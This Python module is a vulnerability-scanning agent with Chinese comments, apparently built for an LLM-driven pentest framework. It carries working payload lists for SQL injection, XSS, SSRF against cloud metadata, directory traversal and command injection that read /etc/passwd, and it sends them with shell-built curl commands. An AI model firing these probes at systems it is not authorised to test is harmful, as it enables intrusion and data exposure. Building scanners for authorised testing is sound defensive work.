"""扫描 Agent — 自动化漏洞检测（SQLi/XSS/SSRF/IDOR 等）"""
from __future__ import annotations

import asyncio
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, urljoin

from cyberagent.agents.base import BaseAgent
from cyberagent.core.shell_executor import run_command, run_commands, check_tool_exists, resolve_tool

logger = logging.getLogger(__name__)


@dataclass
class Finding:
    """漏洞发现"""
    vuln_type: str          # sqli, xss, ssrf, idor, open_redirect, dir_traversal, cmd_injection
    title: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    severity: str = "medium"  # critical, high, medium, low, info
    confidence: str = "medium"  # confirmed, probable, possible
    detail: str = ""
    poc: str = ""


# ---- SQL 注入 payloads ----
SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
]

SQLI_ERROR_PATTERNS = re.compile(
    r"(?i)(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|sqlite3\.OperationalError|"
    r"Unclosed quotation mark|unterminated quoted string|Microsoft OLE DB|ODBC SQL Server|"
    r"You have an error in your SQL syntax|Warning.*mysql_|valid MySQL result|"
    r"MySqlClient\.|com\.mysql\.|org\.postgresql\.|SQLite/JDBCDriver|"
    r"SQLSTATE\[|Syntax error.*in query expression|Division by zero|"
    r"supplied argument is not a valid|pg_query\(\)|pg_exec\(\))",
)

SQLI_TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5),
    ("' OR pg_sleep(5)--", 5),
    ("1; WAITFOR DELAY '0:0:5'--", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
]

SQLI_BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1' --", "1' AND '1'='2' --"),
]

# ---- XSS payloads ----
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    "javascript:alert('XSS')",
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
]

# ---- SSRF payloads ----
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254",  # AWS metadata
    "http://metadata.google.internal",  # GCP metadata
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",  # Redis
]

# ---- Open Redirect payloads ----
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00.legitimate.com",
    "javascript:alert(1)",
]

# ---- 目录遍历 payloads ----
DIR_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
]

# ---- 命令注入 payloads ----
CMD_INJECTION_PAYLOADS = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; cat /etc/passwd", r"root:.*:0:0:"),
    ("| cat /etc/passwd", r"root:.*:0:0:"),
    ("; sleep 5", 5),  # time-based
    ("| sleep 5", 5),
]


class ScannerAgent(BaseAgent):
    """扫描 Agent：自动化漏洞检测"""

    name = "scanner"

    def __init__(self, ctx, recon_results: dict[str, Any] | None = None):
        super().__init__(ctx)
        self.recon = recon_results or {}
        self.findings: list[Finding] = []

    async def execute(self) -> dict[str, Any]:
        # 从侦察结果中提取目标
        targets = self._extract_targets()
        if not targets:
            logger.warning("[scanner] 没有可扫描的目标")
            return {"findings": [], "targets_scanned": 0}

        # API 端点枚举
        if targets["urls"]:
            discovered = await self._discover_api_endpoints(targets["urls"])
            targets["api_endpoints"] = list(set(targets["api_endpoints"] + discovered))

        logger.info("[scanner] 目标: %d 个URL, %d 个API端点",
                     len(targets["urls"]), len(targets["api_endpoints"]))

        # LLM 攻击策略规划
        strategy = await self._plan_attack_strategy(targets)
        logger.info("[scanner] 攻击策略: %s", json.dumps(strategy, ensure_ascii=False)[:200])

        # 运行各检测模块
        scan_tasks = []

        # 1. Nuclei 模板扫描
        if strategy.get("use_nuclei", True) and check_tool_exists("nuclei"):
            scan_tasks.append(("nuclei", self._run_nuclei(targets["urls"])))

        # 2. SQL 注入检测
        if strategy.get("test_sqli", True):
            scan_tasks.append(("sqli", self._test_sqli(targets)))

        # 3. XSS 检测
        if strategy.get("test_xss", True):
            scan_tasks.append(("xss", self._test_xss(targets)))

        # 4. SSRF 检测
        if strategy.get("test_ssrf", True):
            scan_tasks.append(("ssrf", self._test_ssrf(targets)))

        # 5. IDOR 检测
        if strategy.get("test_idor", True):
            scan_tasks.append(("idor", self._test_idor(targets)))

        # 6. Open Redirect
        if strategy.get("test_redirect", True):
            scan_tasks.append(("redirect", self._test_open_redirect(targets)))

        # 7. 目录遍历
        if strategy.get("test_dir_traversal", True):
            scan_tasks.append(("dir_traversal", self._test_dir_traversal(targets)))

        # 8. 命令注入
        if strategy.get("test_cmd_injection", True):
            scan_tasks.append(("cmd_injection", self._test_cmd_injection(targets)))

        # 并发执行
        logger.info("[scanner] 启动 %d 个检测模块...", len(scan_tasks))
        results = await asyncio.gather(
            *[task for _, task in scan_tasks],
            return_exceptions=True,
        )

        for (name, _), result in zip(scan_tasks, results):
            if isinstance(result, Exception):
                logger.error("[scanner] 模块 %s 异常: %s", name, result)
            elif result:
                logger.info("[scanner] 模块 %s 发现 %d 个问题", name, len(result))

        # LLM 综合分析
        if self.findings:
            analysis = await self._analyze_findings()
        else:
            analysis = {"summary": "未发现漏洞", "risk_level": "low"}

        # 存入数据库
        for f in self.findings:
            self.ctx.db.insert_finding(
                self.ctx.target_id, f.vuln_type, f.title,
                f.detail, f.severity, f.evidence,
            )

        return {
            "findings": [
                {
                    "vuln_type": f.vuln_type,
                    "title": f.title,
                    "url": f.url,
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "severity": f.severity,
                    "confidence": f.confidence,
                    "evidence": f.evidence[:200],
                    "poc": f.poc,
                }
                for f in self.findings
            ],
            "total_findings": len(self.findings),
            "analysis": analysis,
            "targets_scanned": len(targets["urls"]),
        }

    # ---- API 端点枚举 ----

    async def _discover_api_endpoints(self, base_urls: list[str]) -> list[str]:
        """主动探测 API 端点"""
        discovered = []
        common_api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/users", "/api/products",
            "/api/feedbacks", "/api/orders", "/api/auth", "/api/login",
            "/api/search", "/api/config", "/api/admin", "/api/token",
            "/api/comments", "/api/basket", "/api/challenges",
            "/graphql", "/gql", "/v1", "/v2",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/wp-json/wp/v2", "/rest/v1",
        ]

        for base_url in base_urls[:2]:
            base = base_url.rstrip("/")
            cmds = [f"curl -s -o /dev/null -w '%{{http_code}} {base}{p}' -m 3 '{base}{p}'"
                    for p in common_api_paths]

            results = await run_commands(cmds, timeout=5, max_concurrent=10)

            for r in results:
                if r.success and r.stdout.strip():
                    parts = r.stdout.strip().split(" ", 1)
                    if len(parts) == 2:
                        code, url = parts
                        code = code.strip("'\" ")
                        if code in ("200", "201", "204", "301", "302", "401", "403"):
                            path = url.replace(base, "")
                            endpoint = f"{base}{path}"
                            if endpoint not in discovered:
                                discovered.append(endpoint)
                            logger.info("[scanner] 发现 API: %s (%s)", path, code)

        return discovered

    # ---- 目标提取 ----

    def _extract_targets(self) -> dict[str, Any]:
        """从侦察结果中提取可扫描的目标"""
        urls: list[str] = []
        api_endpoints: list[str] = []
        params: list[dict] = []

        # 从 HTTP 探测结果提取 URL
        http_data = self.recon.get("stages", {}).get("http_probe", {})
        for t in http_data.get("targets", []):
            url = t.get("url", "")
            if url:
                urls.append(url)

        # 从 JS 分析提取 API 端点
        js_data = self.recon.get("stages", {}).get("js_analysis", [])
        for item in js_data:
            if item.get("type") in ("api_endpoint", "graphql"):
                endpoint = item.get("value", "")
                if endpoint:
                    # 转为完整 URL
                    if endpoint.startswith("/"):
                        base = urls[0].rstrip("/") if urls else ""
                        endpoint = f"{base}{endpoint}"
                    if endpoint.startswith("http"):
                        api_endpoints.append(endpoint)

        # 从端口扫描构造 URL
        port_data = self.recon.get("stages", {}).get("port_scan", {})
        for p in port_data.get("open_ports", []):
            port = p.get("port", 0)
            host = p.get("host", "localhost")
            if port in (80, 443, 8080, 8443, 3000, 5000, 8000):
                scheme = "https" if port in (443, 8443) else "http"
                url = f"{scheme}://{host}:{port}"
                if url not in urls:
                    urls.append(url)

        return {
            "urls": list(set(urls)),
            "api_endpoints": list(set(api_endpoints)),
            "params": params,
        }

    # ---- 攻击策略规划 ----

    async def _plan_attack_strategy(self, targets: dict) -> dict[str, bool]:
        """使用 LLM 规划攻击策略"""
        recon_summary = {
            "urls": targets["urls"][:5],
            "api_endpoints": targets["api_endpoints"][:10],
            "tech_stack": self.recon.get("analysis", {}).get("tech_stack", []),
            "attack_surface": self.recon.get("analysis", {}).get("attack_surface", []),
        }

        prompt = (
            "基于以下侦察数据，规划漏洞扫描策略。返回 JSON 格式，"
            "每个检测模块设为 true/false 表示是否执行：\n\n"
            f"{json.dumps(recon_summary, ensure_ascii=False, indent=2)}\n\n"
            "返回格式:\n"
            '{"use_nuclei": true, "test_sqli": true, "test_xss": true, '
            '"test_ssrf": false, "test_idor": true, "test_redirect": true, '
            '"test_dir_traversal": true, "test_cmd_injection": false}'
        )

        try:
            result = await self.ctx.llm.chat_json_pro(
                prompt,
                system_prompt=(
                    "你是一个安全测试策略规划专家。根据侦察结果判断哪些漏洞类型值得测试。"
                    "对于已知靶场应用（如OWASP Juice Shop），所有类型都值得测试。"
                    "只返回JSON，不要其他文字。"
                ),
            )
            return result
        except Exception:
            # 默认全测
            return {
                "use_nuclei": True, "test_sqli": True, "test_xss": True,
                "test_ssrf": True, "test_idor": True, "test_redirect": True,
                "test_dir_traversal": True, "test_cmd_injection": True,
            }

    # ---- Nuclei 模板扫描 ----

    async def _run_nuclei(self, urls: list[str]) -> list[Finding]:
        """运行 Nuclei 模板扫描"""
        findings = []
        nuclei_bin = resolve_tool("nuclei")

        for url in urls[:3]:
            logger.info("[scanner] Nuclei 扫描: %s", url)
            result = await run_command(
                f"echo '{url}' | {nuclei_bin} -silent -severity medium,high,critical -json -timeout 10",
                timeout=180,
            )
            if result.success:
                for line in result.lines:
                    try:
                        data = json.loads(line)
                        f = Finding(
                            vuln_type=data.get("type", "nuclei"),
                            title=data.get("info", {}).get("name", "Nuclei Finding"),
                            url=data.get("matched-at", url),
                            severity=data.get("info", {}).get("severity", "medium"),
                            evidence=data.get("extracted-results", ""),
                            detail=data.get("info", {}).get("description", ""),
                            confidence="probable",
                        )
                        findings.append(f)
                        self.findings.append(f)
                    except json.JSONDecodeError:
                        continue

        return findings

    # ---- SQL 注入检测 ----

    async def _test_sqli(self, targets: dict) -> list[Finding]:
        """SQL 注入检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        for url in urls[:5]:
            # 提取 URL 参数
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if params:
                # 测试 URL 参数
                for param_name in params:
                    result = await self._sqli_test_param(url, param_name)
                    findings.extend(result)

            # 测试 URL 路径中的 ID 参数
            id_params = re.findall(r'/(\d+)(?:/|$)', parsed.path)
            if id_params:
                result = await self._sqli_test_path(url)
                findings.extend(result)

        self.findings.extend(findings)
        return findings

    async def _sqli_test_param(self, url: str, param: str) -> list[Finding]:
        """测试单个参数的 SQL 注入"""
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        # 1. Error-based 检测
        for payload in SQLI_ERROR_PAYLOADS:
            test_params = {k: v[0] for k, v in base_params.items()}
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if r.success and SQLI_ERROR_PATTERNS.search(r.stdout):
                f = Finding(
                    vuln_type="sqli",
                    title=f"SQL注入 (Error-based): 参数 {param}",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=SQLI_ERROR_PATTERNS.search(r.stdout).group()[:100],
                    severity="critical",
                    confidence="confirmed",
                )
                findings.append(f)
                logger.warning("[scanner] SQLi 发现! %s param=%s", url, param)
                return findings  # 找到就停

        # 2. Boolean-based 检测
        for true_payload, false_payload in SQLI_BOOL_PAYLOADS:
            true_params = {k: v[0] for k, v in base_params.items()}
            true_params[param] = true_payload
            true_url = urlunparse(parsed._replace(query=urlencode(true_params)))

            false_params = {k: v[0] for k, v in base_params.items()}
            false_params[param] = false_payload
            false_url = urlunparse(parsed._replace(query=urlencode(false_params)))

            r_true = await run_command(f"curl -sL -m 10 '{true_url}'", timeout=15)
            r_false = await run_command(f"curl -sL -m 10 '{false_url}'", timeout=15)

            if r_true.success and r_false.success:
                len_diff = abs(len(r_true.stdout) - len(r_false.stdout))
                # 长度差异显著说明可能存在注入
                if len_diff > 100 and len(r_true.stdout) > 0 and len(r_false.stdout) > 0:
                    f = Finding(
                        vuln_type="sqli",
                        title=f"SQL注入 (Boolean-based): 参数 {param}",
                        url=url,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=f"响应长度差异: {len_diff} bytes",
                        severity="critical",
                        confidence="probable",
                    )
                    findings.append(f)
                    return findings

        # 3. Time-based 检测
        for payload, delay in SQLI_TIME_PAYLOADS:
            test_params = {k: v[0] for k, v in base_params.items()}
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            r = await run_command(f"curl -sL -m {delay + 5} '{test_url}'", timeout=delay + 10)
            if r.success and not r.timed_out:
                # 检查实际耗时（从 stderr 提取 curl time）
                time_check = await run_command(
                    f"curl -sL -o /dev/null -w '%{{time_total}}' -m {delay + 5} '{test_url}'",
                    timeout=delay + 10,
                )
                if time_check.success:
                    try:
                        elapsed = float(time_check.stdout.strip())
                        if elapsed >= delay - 1:  # 允许1秒误差
                            f = Finding(
                                vuln_type="sqli",
                                title=f"SQL注入 (Time-based): 参数 {param}",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=f"响应延迟 {elapsed:.1f}s (预期 {delay}s)",
                                severity="critical",
                                confidence="probable",
                            )
                            findings.append(f)
                            return findings
                    except ValueError:
                        pass

        return findings

    async def _sqli_test_path(self, url: str) -> list[Finding]:
        """测试路径中的 ID 参数"""
        findings = []
        parsed = urlparse(url)
        path = parsed.path

        # 替换路径中的数字 ID 为 SQL payload
        test_paths = [
            (re.sub(r'/(\d+)', "/1 OR 1=1", path, count=1), "' OR 1=1"),
            (re.sub(r'/(\d+)', "/1' OR '1'='1", path, count=1), "' OR '1'='1"),
        ]

        baseline_r = await run_command(f"curl -sL -m 10 '{url}'", timeout=15)
        if not baseline_r.success:
            return findings

        for test_path, payload in test_paths:
            test_url = urlunparse(parsed._replace(path=test_path))
            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if not r.success:
                continue

            # Error-based
            if SQLI_ERROR_PATTERNS.search(r.stdout):
                findings.append(Finding(
                    vuln_type="sqli", title=f"SQL注入 (Path): {path}",
                    url=url, parameter="path", payload=payload,
                    evidence=SQLI_ERROR_PATTERNS.search(r.stdout).group()[:100],
                    severity="critical", confidence="confirmed",
                ))
                return findings

            # Boolean-based: 注入后响应与基线差异
            if len(r.stdout) > 0 and abs(len(r.stdout) - len(baseline_r.stdout)) > 200:
                findings.append(Finding(
                    vuln_type="sqli", title=f"SQL注入 (Path Boolean): {path}",
                    url=url, parameter="path", payload=payload,
                    evidence=f"响应长度差异: {abs(len(r.stdout) - len(baseline_r.stdout))} bytes",
                    severity="critical", confidence="probable",
                ))
                return findings

        return findings

    # ---- XSS 检测 ----

    async def _test_xss(self, targets: dict) -> list[Finding]:
        """Reflected XSS 检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        marker = "cyberXSS42"
        test_payloads = [
            f'<script>{marker}</script>',
            f'">{marker}',
            f"'>{marker}",
            f'<img src=x onerror={marker}>',
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                continue

            for param_name in params:
                for payload in test_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and marker in r.stdout:
                        # 确认反射存在
                        f = Finding(
                            vuln_type="xss",
                            title=f"Reflected XSS: 参数 {param_name}",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Payload '{marker}' 在响应中被反射",
                            severity="high",
                            confidence="confirmed",
                            poc=test_url,
                        )
                        findings.append(f)
                        self.findings.append(f)
                        logger.warning("[scanner] XSS 发现! %s param=%s", url, param_name)
                        break  # 该参数已确认
                else:
                    continue
                break  # 该 URL 已确认

        return findings

    # ---- SSRF 检测 ----

    async def _test_ssrf(self, targets: dict) -> list[Finding]:
        """SSRF 检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        # 识别可能接受 URL 的参数
        url_params = {"url", "uri", "link", "href", "src", "dest", "redirect",
                      "feed", "img", "image", "file", "path", "page", "proxy",
                      "fetch", "load", "redirect_uri", "callback", "return_url"}

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in url_params:
                    for ssrf_url in SSRF_PAYLOADS[:3]:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = ssrf_url
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r.success:
                            # 检查是否包含内部服务响应特征
                            if any(sig in r.stdout for sig in ["root:", "ami-", "instance-id", "127.0.0.1"]):
                                f = Finding(
                                    vuln_type="ssrf",
                                    title=f"SSRF: 参数 {param_name}",
                                    url=url,
                                    parameter=param_name,
                                    payload=ssrf_url,
                                    evidence=r.stdout[:200],
                                    severity="critical",
                                    confidence="probable",
                                )
                                findings.append(f)
                                self.findings.append(f)
                                break

        return findings

    # ---- IDOR 检测 ----

    async def _test_idor(self, targets: dict) -> list[Finding]:
        """IDOR 检测（基于 API 端点，包括路径 ID 枚举）"""
        findings = []
        endpoints = targets["api_endpoints"]

        for endpoint in endpoints:
            base = endpoint.rstrip("/")

            # 检查路径中是否有数字 ID
            id_matches = re.findall(r'/(\d+)(?:/|$)', base)

            if id_matches:
                # 已有 ID，测试相邻 ID
                for id_val in id_matches:
                    for test_id in [str(int(id_val) + 1), str(int(id_val) - 1), "1", "2"]:
                        if test_id == id_val:
                            continue
                        test_url = base.replace(f"/{id_val}/", f"/{test_id}/").replace(f"/{id_val}", f"/{test_id}")
                        r1 = await run_command(f"curl -sL -m 10 '{base}'", timeout=15)
                        r2 = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r1.success and r2.success and len(r2.stdout) > 50:
                            if abs(len(r1.stdout) - len(r2.stdout)) < len(r1.stdout) * 0.5:
                                f = Finding(
                                    vuln_type="idor", title=f"潜在 IDOR: {base}",
                                    url=base, parameter=f"id={id_val}",
                                    payload=f"访问 id={test_id}",
                                    evidence=f"两个 ID 都返回有效响应",
                                    severity="high", confidence="possible", poc=test_url,
                                )
                                findings.append(f)
                                self.findings.append(f)
                                break
            else:
                # 没有 ID，尝试追加 ID 测试（RESTful 风格）
                for test_id in ["1", "2", "3"]:
                    test_url = f"{base}/{test_id}"
                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and len(r.stdout) > 50:
                        # 检查是否返回了有意义的数据（非 SPA 页面）
                        if "<!doctype html>" not in r.stdout.lower()[:200]:
                            # 对 ID=1 和 ID=2 做 IDOR 验证
                            r1 = await run_command(f"curl -sL -m 10 '{base}/1'", timeout=15)
                            r2 = await run_command(f"curl -sL -m 10 '{base}/2'", timeout=15)
                            if r1.success and r2.success:
                                if len(r1.stdout) > 50 and len(r2.stdout) > 50:
                                    f = Finding(
                                        vuln_type="idor",
                                        title=f"IDOR: {base} 支持 ID 访问",
                                        url=base, parameter="id",
                                        payload=f"GET {base}/1, GET {base}/2",
                                        evidence=f"ID=1 返回 {len(r1.stdout)} bytes, ID=2 返回 {len(r2.stdout)} bytes",
                                        severity="high", confidence="probable",
                                        poc=f"{base}/1",
                                    )
                                    findings.append(f)
                                    self.findings.append(f)
                                    break

        return findings

    # ---- Open Redirect ----

    async def _test_open_redirect(self, targets: dict) -> list[Finding]:
        """Open Redirect 检测"""
        findings = []
        redirect_params = {"redirect", "url", "next", "return", "return_url", "redirect_uri",
                           "continue", "dest", "destination", "go", "out", "view", "to"}

        for url in targets["urls"][:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in redirect_params:
                    for payload in REDIRECT_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(
                            f"curl -sI -m 10 '{test_url}'",
                            timeout=15,
                        )
                        if r.success:
                            location_match = re.search(r'(?i)^location:\s*(.+)', r.stdout, re.MULTILINE)
                            if location_match:
                                location = location_match.group(1).strip()
                                if "evil.com" in location or payload in location:
                                    f = Finding(
                                        vuln_type="open_redirect",
                                        title=f"Open Redirect: 参数 {param_name}",
                                        url=url,
                                        parameter=param_name,
                                        payload=payload,
                                        evidence=f"重定向到: {location}",
                                        severity="medium",
                                        confidence="confirmed",
                                    )
                                    findings.append(f)
                                    self.findings.append(f)
                                    break

        return findings

    # ---- 目录遍历 ----

    async def _test_dir_traversal(self, targets: dict) -> list[Finding]:
        """目录遍历检测"""
        findings = []
        file_params = {"file", "path", "folder", "dir", "document", "include",
                       "page", "lang", "template", "php_path", "doc", "filepath"}

        for url in targets["urls"][:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in file_params:
                    for payload in DIR_TRAVERSAL_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r.success and re.search(r'root:.*:0:0:', r.stdout):
                            f = Finding(
                                vuln_type="dir_traversal",
                                title=f"目录遍历: 参数 {param_name}",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence="读取到 /etc/passwd 内容",
                                severity="critical",
                                confidence="confirmed",
                            )
                            findings.append(f)
                            self.findings.append(f)
                            return findings

        return findings

    # ---- 命令注入 ----

    async def _test_cmd_injection(self, targets: dict) -> list[Finding]:
        """命令注入检测"""
        findings = []
        input_params = {"cmd", "command", "exec", "ping", "host", "ip", "query",
                        "shell", "run", "system"}

        for url in targets["urls"][:3]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in input_params:
                    for payload, expected in CMD_INJECTION_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        original = test_params[param_name]
                        test_params[param_name] = original + payload

                        method = "GET"
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        if isinstance(expected, int):
                            # Time-based
                            r = await run_command(f"curl -sL -o /dev/null -w '%{{time_total}}' -m {expected + 5} '{test_url}'", timeout=expected + 10)
                            if r.success:
                                try:
                                    elapsed = float(r.stdout.strip())
                                    if elapsed >= expected - 1:
                                        f = Finding(
                                            vuln_type="cmd_injection",
                                            title=f"命令注入 (Time-based): 参数 {param_name}",
                                            url=url, parameter=param_name,
                                            payload=payload,
                                            evidence=f"延迟 {elapsed:.1f}s",
                                            severity="critical", confidence="probable",
                                        )
                                        findings.append(f)
                                        self.findings.append(f)
                                        return findings
                                except ValueError:
                                    pass
                        else:
                            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                            if r.success and re.search(expected, r.stdout):
                                f = Finding(
                                    vuln_type="cmd_injection",
                                    title=f"命令注入: 参数 {param_name}",
                                    url=url, parameter=param_name,
                                    payload=payload,
                                    evidence=re.search(expected, r.stdout).group()[:100],
                                    severity="critical", confidence="confirmed",
                                )
                                findings.append(f)
                                self.findings.append(f)
                                return findings

        return findings

    # ---- LLM 分析 ----

    async def _analyze_findings(self) -> dict[str, Any]:
        """使用 LLM 分析所有发现"""
        findings_summary = [
            {
                "type": f.vuln_type,
                "title": f.title,
                "url": f.url,
                "severity": f.severity,
                "confidence": f.confidence,
                "evidence": f.evidence[:100],
            }
            for f in self.findings
        ]

        prompt = (
            f"以下是针对 {self.ctx.target_domain} 的漏洞扫描结果:\n\n"
            f"{json.dumps(findings_summary, ensure_ascii=False, indent=2)}\n\n"
            "请分析这些发现，评估整体风险等级，并给出修复建议。"
            "返回JSON格式:\n"
            '{"summary": "总结", "risk_level": "critical/high/medium/low", '
            '"remediation": ["修复建议1", "修复建议2"]}'
        )

        try:
            return await self.ctx.llm.chat_json_pro(prompt)
        except Exception:
            return {"summary": f"发现 {len(self.findings)} 个漏洞", "risk_level": "high"}
